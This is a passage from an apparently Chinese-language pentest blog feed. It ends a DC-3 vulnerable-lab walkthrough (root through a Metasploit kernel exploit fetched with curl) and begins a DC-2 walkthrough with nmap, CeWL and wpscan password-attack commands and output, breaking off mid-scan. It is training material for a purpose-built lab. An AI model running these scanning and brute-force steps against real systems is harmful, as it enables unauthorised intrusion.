-a</code>和<code>uname -a</code>命令查看系统版本和内核版本，发现Ubuntu 16.04 内核 4.4.0 正好满足漏洞发生条件。</p><p><img src="https://i.loli.net/2021/04/27/f8Lv7kKGmo4l2H5.png" alt="image-20210426231218340"></p><p>但是网上找到的EXP都跑不通，于是在metasploit中搜索，发现了相同的漏洞，使用metasploit中提供的EXP。</p><p><img src="https://i.loli.net/2021/04/27/J6YbsaNfS7M3AxD.png" alt="image-20210426232751089"></p><p>通过python起一个http服务，在shell中通过curl将漏洞利用脚本下载到服务器上，编译运行。</p><p><img src="https://i.loli.net/2021/04/27/GaWUQvL3lneNDC4.png" alt="image-20210426232326183"></p><p>因为该漏洞利用是对内存的利用，当进行一次提权之后，被利用的内存位置中的数据就会发生改变，导致无法进行第二次提权。因此，服务器每次重启只能使用该方式进行一次提权，提权后应当尽快进行权限维持。</p><p><img src="https://i.loli.net/2021/04/27/Vt9wqPcnKGNpfEx.png" alt="image-20210426232644658"></p><p>在<code>/root</code>目录下读取到flag。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Walkthrough-for-DC-03&quot;&gt;&lt;a href=&quot;#Walkthrough-for-DC-03&quot; class=&quot;headerlink&quot; title=&quot;Walkthrough for DC-03&quot;&gt;&lt;/a&gt;Walkthrough for DC-03&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Description&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&amp;#39;t give you the answer, instead, I&amp;#39;ll give you an idea about how to move forward.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;For those with experience doing CTF and Boot2Root challenges, this probably won&amp;#39;t take you long at all (in fact, it could take you less than 20 minutes easily).&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;If that&amp;#39;s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Pentest" scheme="http://example.com/categories/Pentest/"/>
    
    
    <category term="Pentest" scheme="http://example.com/tags/Pentest/"/>
    
    <category term="DC" scheme="http://example.com/tags/DC/"/>
    
    <category term="Walkthrough" scheme="http://example.com/tags/Walkthrough/"/>
    
  </entry>
  
  <entry>
    <title>Walkthrough for DC-02</title>
    <link href="http://example.com/2021/04/24/DC-02/"/>
    <id>http://example.com/2021/04/24/DC-02/</id>
    <published>2021-04-24T12:03:25.000Z</published>
    <updated>2021-04-24T12:07:00.422Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Walkthrough-for-DC-02"><a href="#Walkthrough-for-DC-02" class="headerlink" title="Walkthrough for DC-02"></a>Walkthrough for DC-02</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Description</span><br><span class="line"></span><br><span class="line">Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</span><br><span class="line">就像DC-1一样，DC-2是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">As with the original DC-1, it&#39;s designed with beginners in mind.</span><br><span class="line">与DC-1，它的设计充分考虑初学者。</span><br><span class="line"></span><br><span class="line">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span><br><span class="line">需要具备Linux技能并熟悉Linux命令行，以及一些基本渗透测试工具。</span><br><span class="line"></span><br><span class="line">Just like with DC-1, there are five flags including the final flag.</span><br><span class="line">与DC-1一样，共有包括final flag在内的5个flag。</span><br><span class="line"></span><br><span class="line">And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.</span><br><span class="line">同样，就像DC-1一样，flag对于初学者来说很重要，但对有经验的人则不那么重要。</span><br><span class="line"></span><br><span class="line">In short, the only flag that really counts, is the final flag.</span><br><span class="line">简而言之，唯一真正重要的flag是final flag。</span><br><span class="line"></span><br><span class="line">For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.</span><br><span class="line">对于初学者来说，Google是您的朋友。 好吧，除了所有的隐私问题等等。</span><br><span class="line"></span><br><span class="line">I haven&#39;t explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.</span><br><span class="line">我没有探索获取root权限的所有方法，因为我废弃了我一直在使用的先前版本，并且除了基本的OS安装之外，还开始全新的学习。</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="https://www.five86.com/dc-2.html">DC-02</a></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><h3 id="nmap端口扫描"><a href="#nmap端口扫描" class="headerlink" title="nmap端口扫描"></a>nmap端口扫描</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">noah</span>@<span class="type">NoahsKali</span> ~&gt; sudo nmap -sT -sV -<span class="type">A</span> -p- -<span class="type">T5</span> <span class="number">192.168</span><span class="number">.21</span><span class="number">.160</span></span><br><span class="line"><span class="type">Starting</span> <span class="type">Nmap</span> <span class="number">7.91</span> ( https://nmap.org ) at <span class="number">2021</span><span class="number">-04</span><span class="number">-24</span> <span class="number">12</span>:<span class="number">21</span> <span class="type">HKT</span></span><br><span class="line"><span class="type">Nmap</span> scan report for dc<span class="number">-2</span> (<span class="number">192.168</span><span class="number">.21</span><span class="number">.160</span>)</span><br><span class="line"><span class="type">Host</span> is up (<span class="number">0.00036</span>s latency).</span><br><span class="line"><span class="type">Not</span> shown: <span class="number">65533</span> closed ports</span><br><span class="line"><span class="type">PORT</span>     <span class="type">STATE</span> <span class="type">SERVICE</span> <span class="type">VERSION</span></span><br><span class="line"><span class="number">80</span>/tcp   open  http    <span class="type">Apache</span> httpd <span class="number">2.4</span><span class="number">.10</span> ((<span class="type">Debian</span>))</span><br><span class="line">|_http-generator: <span class="type">WordPress</span> <span class="number">4.7</span><span class="number">.10</span></span><br><span class="line">|_http-server-header: <span class="type">Apache</span>/<span class="number">2.4</span><span class="number">.10</span> (<span class="type">Debian</span>)</span><br><span class="line">|_http-title: <span class="type">DC</span><span class="number">-2</span> &amp;#<span class="number">8211</span>; <span class="type">Just</span> another <span class="type">WordPress</span> site</span><br><span class="line"><span class="number">7744</span>/tcp open  ssh     <span class="type">OpenSSH</span> <span class="number">6.7</span>p1 <span class="type">Debian</span> <span class="number">5</span>+deb8u7 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">1024</span> <span class="number">52</span>:<span class="number">51</span>:<span class="number">7</span>b:<span class="number">6</span>e:<span class="number">70</span>:a4:<span class="number">33</span>:<span class="number">7</span>a:d2:<span class="number">4</span>b:e1:<span class="number">0</span>b:<span class="number">5</span>a:<span class="number">0</span>f:<span class="number">9</span>e:d7 (<span class="type">DSA</span>)</span><br><span class="line">|   <span class="number">2048</span> <span class="number">59</span>:<span class="number">11</span>:d8:af:<span class="number">38</span>:<span class="number">51</span>:<span class="number">8</span>f:<span class="number">41</span>:a7:<span class="number">44</span>:b3:<span class="number">28</span>:<span class="number">03</span>:<span class="number">80</span>:<span class="number">99</span>:<span class="number">42</span> (<span class="type">RSA</span>)</span><br><span class="line">|   <span class="number">256</span> df:<span class="number">18</span>:<span class="number">1</span>d:<span class="number">74</span>:<span class="number">26</span>:ce:c1:<span class="number">4</span>f:<span class="number">6</span>f:<span class="number">2</span>f:c1:<span class="number">26</span>:<span class="number">54</span>:<span class="number">31</span>:<span class="number">51</span>:<span class="number">91</span> (<span class="type">ECDSA</span>)</span><br><span class="line">|_  <span class="number">256</span> d9:<span class="number">38</span>:<span class="number">5</span>f:<span class="number">99</span>:<span class="number">7</span>c:<span class="number">0</span>d:<span class="number">64</span>:<span class="number">7</span>e:<span class="number">1</span>d:<span class="number">46</span>:f6:e9:<span class="number">7</span>c:c6:<span class="number">37</span>:<span class="number">17</span> (<span class="type">ED25519</span>)</span><br><span class="line"><span class="type">MAC</span> <span class="type">Address</span>: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">92</span>:<span class="number">5</span>D:<span class="number">3</span>A (<span class="type">VMware</span>)</span><br><span class="line"><span class="type">Device</span> <span class="class"><span class="keyword">type</span>: general purpose</span></span><br><span class="line"><span class="type">Running</span>: <span class="type">Linux</span> <span class="number">3.</span><span class="type">X</span>|<span class="number">4.</span><span class="type">X</span></span><br><span class="line"><span class="type">OS</span> <span class="type">CPE</span>: cpe:/o:linux:linux_kernel:<span class="number">3</span> cpe:/o:linux:linux_kernel:<span class="number">4</span></span><br><span class="line"><span class="type">OS</span> details: <span class="type">Linux</span> <span class="number">3.2</span> - <span class="number">4.9</span></span><br><span class="line"><span class="type">Network</span> <span class="type">Distance</span>: <span class="number">1</span> hop</span><br><span class="line"><span class="type">Service</span> <span class="type">Info</span>: <span class="type">OS</span>: <span class="type">Linux</span>; <span class="type">CPE</span>: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line"><span class="type">TRACEROUTE</span></span><br><span class="line"><span class="type">HOP</span> <span class="type">RTT</span>     <span class="type">ADDRESS</span></span><br><span class="line"><span class="number">1</span>   <span class="number">0.37</span> ms dc<span class="number">-2</span> (<span class="number">192.168</span><span class="number">.21</span><span class="number">.160</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">OS</span> and <span class="type">Service</span> detection performed. <span class="type">Please</span> report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="type">Nmap</span> done: <span class="number">1</span> <span class="type">IP</span> address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.43</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到服务器开放了两个端口，一个是部署了wordpress的80端口，一个是跑了ssh的7744端口</p><h3 id="访问wordpress页面"><a href="#访问wordpress页面" class="headerlink" title="访问wordpress页面"></a>访问wordpress页面</h3><p>直接访问ip地址的话会报错，修改一下hosts，让ip地址被解析为<a href="http://dc-2即可./">http://dc-2即可。</a><br>访问网页后找到flag1</p><p><img src="https://i.loli.net/2021/04/24/Hlocsw2vzJGh3EK.png" alt="image-20210424124053653"></p><p><img src="https://i.loli.net/2021/04/24/nZGiQNOL4HzKlv9.png" alt="image-20210424124154689"></p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><h3 id="使用CeWL生成字典"><a href="#使用CeWL生成字典" class="headerlink" title="使用CeWL生成字典"></a>使用CeWL生成字典</h3><p>根据flag1里的提示，使用CeWL生成字典。<br>其实完全没有必要，拿一个弱口令字典一样可以用。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">noah</span>@<span class="type">NoahsKali</span> ~/<span class="type">T</span>/<span class="type">CeWL</span>&gt; ruby cewl.rb http://dc<span class="number">-2</span>/ &gt; ~/<span class="type">Desktop</span>/<span class="type">DC</span><span class="number">-02</span>/wppass.dic</span><br></pre></td></tr></table></figure><h3 id="使用wpscan扫描"><a href="#使用wpscan扫描" class="headerlink" title="使用wpscan扫描"></a>使用wpscan扫描</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">noah</span>@<span class="type">NoahsKali</span> ~ [<span class="number">1</span>]&gt; wpscan <span class="comment">--password-attack wp-login --passwords ~/Desktop/DC-02/wppass.dic --api-token L1HHTCzyd5B********EYGKsd8nj4tb0rg885Wh3WgM --url http://dc-2/</span></span><br><span class="line"><span class="title">_______________________________________________________________</span></span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         <span class="type">WordPress</span> <span class="type">Security</span> <span class="type">Scanner</span> by the <span class="type">WPScan</span> <span class="type">Team</span></span><br><span class="line">                         <span class="type">Version</span> <span class="number">3.8</span><span class="number">.17</span></span><br><span class="line">       <span class="type">Sponsored</span> by <span class="type">Automattic</span> - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line"><span class="title">_______________________________________________________________</span></span><br><span class="line"></span><br><span class="line">[+] <span class="type">URL</span>: http://dc<span class="number">-2</span>/ [<span class="number">192.168</span><span class="number">.21</span><span class="number">.160</span>]</span><br><span class="line">[+] <span class="type">Started</span>: <span class="type">Sat</span> <span class="type">Apr</span> <span class="number">24</span> <span class="number">12</span>:<span class="number">45</span>:<span class="number">29</span> <span class="number">2021</span></span><br><span class="line"></span><br><span class="line"><span class="type">Interesting</span> <span class="type">Finding</span>(s):</span><br><span class="line"></span><br><span class="line">[+] <span class="type">Headers</span></span><br><span class="line"> | <span class="type">Interesting</span> <span class="type">Entry</span>: <span class="type">Server</span>: <span class="type">Apache</span>/<span class="number">2.4</span><span class="number">.10</span> (<span class="type">Debian</span>)</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Headers</span> (<span class="type">Passive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confidence</span>: <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[+] <span class="type">XML</span>-<span class="type">RPC</span> seems to be enabled: http://dc<span class="number">-2</span>/xmlrpc.php</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Direct</span> <span class="type">Access</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confidence</span>: <span class="number">100</span>%</span><br><span class="line"> | <span class="type">References</span>:</span><br><span class="line"> |  - http://codex.wordpress.org/<span class="type">XML</span>-<span class="type">RPC_Pingback_API</span></span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] <span class="type">WordPress</span> readme found: http://dc<span class="number">-2</span>/readme.html</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Direct</span> <span class="type">Access</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confidence</span>: <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[+] <span class="type">The</span> external <span class="type">WP</span>-<span class="type">Cron</span> seems to be enabled: http://dc<span class="number">-2</span>/wp-cron.php</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Direct</span> <span class="type">Access</span> (<span class="type">Aggressive</span> <span class="type">Detection</span>)</span><br><span class="line"> | <span class="type">Confidence</span>: <span class="number">60</span>%</span><br><span class="line"> | <span class="type">References</span>:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/<span class="number">1299</span></span><br><span class="line"></span><br><span class="line">[+] <span class="type">WordPress</span> version <span class="number">4.7</span><span class="number">.10</span> identified (<span class="type">Insecure</span>, released on <span class="number">2018</span><span class="number">-04</span><span class="number">-03</span>).</span><br><span class="line"> | <span class="type">Found</span> <span class="type">By</span>: <span class="type">Rss</span> <span class="type">Generator</span> (<span class="type">Passive</span> <span class="type">Detection</span>)</span><br><span class="line"> |  - http://dc<span class="number">-2</span>/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=<span class="number">4.7</span><span class="number">.10</span>&lt;/generator&gt;</span><br><span class="line"> |  - http://dc<span class="number">-2</span>/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=<span class="number">4.7</span><span class="number">.10</span>&lt;/generator&gt;</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="number">33</span> vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">4.9</span><span class="number">.6</span> - <span class="type">Authenticated</span> <span class="type">Arbitrary</span> <span class="type">File</span> <span class="type">Deletion</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.11</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">42</span>ab2bd9-bbb1<span class="number">-4</span>f25-a632<span class="number">-1811</span>c5130bb4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span 